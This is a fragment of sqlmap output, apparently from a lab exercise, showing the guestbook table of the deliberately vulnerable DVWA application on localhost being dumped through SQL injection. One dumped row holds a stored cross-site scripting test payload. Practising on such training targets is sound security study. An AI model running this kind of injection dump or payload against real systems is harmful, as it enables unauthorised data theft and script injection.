   [06:52:17] [INFO] fetching entries for table 'guestbook' in database 'dvwa'
   [06:52:17] [INFO] fetching number of entries for table 'guestbook' in database 'dvwa'
   [06:52:17] [INFO] retrieved: 3
   [06:52:17] [INFO] retrieved: asdfa
   [06:52:17] [INFO] retrieved: ajeng
   [06:52:18] [INFO] retrieved: 3
   [06:52:18] [INFO] retrieved: <script>alert("sured")</script>
   [06:52:20] [INFO] retrieved: asep
   [06:52:20] [INFO] retrieved: 2
   [06:52:20] [INFO] retrieved: This is a test comment.
   [06:52:22] [INFO] retrieved: test
   [06:52:22] [INFO] retrieved: 1
   Database: dvwa
   Table: guestbook
   [3 entries]
   +------------+--------+---------------------------------+
   | comment_id | name   | comment                         |
   +------------+--------+---------------------------------+
   | 3          | ajeng  | asdfa                           |
   | 2          | asep   | <script>alert("sured")</script> |
   | 1          | test   | This is a test comment.         |
   +------------+--------+---------------------------------+

   [06:52:22] [INFO] table 'dvwa.guestbook' dumped to CSV file '/home/kyouma/.local/share/sqlmap/output/127.0.0.1/dump/dvwa/guestbook.csv'
   [06:52:22] [INFO] fetched data logged to text files under '/home/kyouma/.local/share/sqlmap/output/127.0.0.1'

   [*] ending @ 06:52:22 /2024-12-03/
   ```
